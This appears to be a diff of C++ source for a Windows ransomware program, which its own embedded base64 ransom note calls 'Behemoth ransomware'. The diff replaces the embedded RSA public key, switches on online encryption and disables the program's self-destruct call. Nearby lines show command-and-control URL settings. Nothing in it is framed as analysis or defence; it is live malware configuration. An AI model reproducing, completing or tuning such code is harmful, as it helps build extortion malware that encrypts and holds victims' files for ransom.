@@ -27,10 +27,10 @@
 #include "Helpers/wstringToString.hpp"
 
 
-std::string PUBLIC_KEY = "MIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKCAYEAydGwvuurofZFGQD6mDYPjq4JJDLGjiSBREcqAhb/2+njKYcJw4yyJlicn/vhDpiwoar2tMK0Ry1tY44hWjbrVBYNM+dav8qiTj9KtHyI9iZwqmZNU9hhlpKcYiirCYhS9d4GqDBTe/GciueB5rcI/0s8UAtkrHprJLGWHFo1RgooJxRcKnxhOS3Em+PYsenlrLgeCKKMMzn896pG5J6SI7K+bamgTu9d6Xi01ZFtN5glIQGspZd0guJOkVN2Gf0Lp8Yq/KA9rGQv7G8SlyQbyssDPVDXz/5fHuYOVedlseFllkNKEqfCPcvgp/Jrmr3h4D3s8avhrzAP2wJUXqRR+YwFLYHkglJ/zVubPqgtAJrb5VnbZeMLhyILbfEV8CW8ydpYMsmSeWuSFDz7z9Bg7EE6EFCZ4qx6vIzgNg/GOMsUyyarztnf/N9T2QWXbcex6/+c34kNO3y8aay1xkK8AAvk8bkOBWIEDS7bvJ7c0CYkZZehqSCJ/vkr706Ye27HAgMBAAE=";
+std::string PUBLIC_KEY = "MIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKCAYEArmP8h2N1E11LUj0tYMbGfdP2DwQQyzMO7o3CF3eTSzT2x7RaKqLd1pPYcayeccZL6hvb9duY7KqkLbaRBxxVXEvaQN42fsXevqSBPjIEImGjTprKnNnOHSejNF85LvhnOZxGttJSMLI/X3s0FS/4ia3k4tkYMSs9Jm1exu37waJWq5yUFWeWnuwPgqd7iSG90ebkD5Q/V2UUq8yVj7GcP0T3kjNfn6YCK78uWDasi1uyPf+b4J8Fp8t84GhLZZJXRRnROsCIAEvtIEaPzzkGTs4YQkzPjfRHulbuwTSWAM5asJ+98K3u4yBPsSLe2n/8HFke2MVXsuiSFGpsMhnRyDj45z3P0eEEdBDBCP+M4dVDJ1p1DxhycrI02uwM7jBubTAOYfXmrA7tWkg7Iz/WOx1edJJDL9Y8T58/Fr5mvCxGbr3dB1yskE1aXs1+9yNVeJ2hOo92/YTKZDq/GCCyHvWJlJ4lPNHNgtVObeQtRR6GAFr6QRkv55SWqkuJzT7pAgMBAAE=";
 std::string README = "WW91ciBmaWxlcyBoYXMgYmVlbiBlbmNyeXB0ZWQgd2l0aCBCZWhlbW90aCByYW5zb213YXJlLgoKVGhlIGZpbGUgaGFzaCBmb3IgdGhpcyBleGVjdXRhYmxlIGlzIFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFgKCkNvbnN0YW50IHVzIGF0IGNvbnN0YW50QGMwbnN0YW50LmNhIHdpdGggdGhlIGV4ZWN1dGFibGUncyBoYXNoIHRvIGRlY3J5cHQgeW91ciBmaWxlcy4KCg==";
 
-bool ONLINE_ENC = false;
+bool ONLINE_ENC = true;
 std::wstring C2_URL = L"";                /// populate this with if statements inside main
 std::vector<std::wstring> URLS = {
         L"http://10.0.0.140/",
@@ -64,7 +64,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         encryption(false);
     }
 
-    self_destruct();
+    //self_destruct();
 
     return 0;
 }
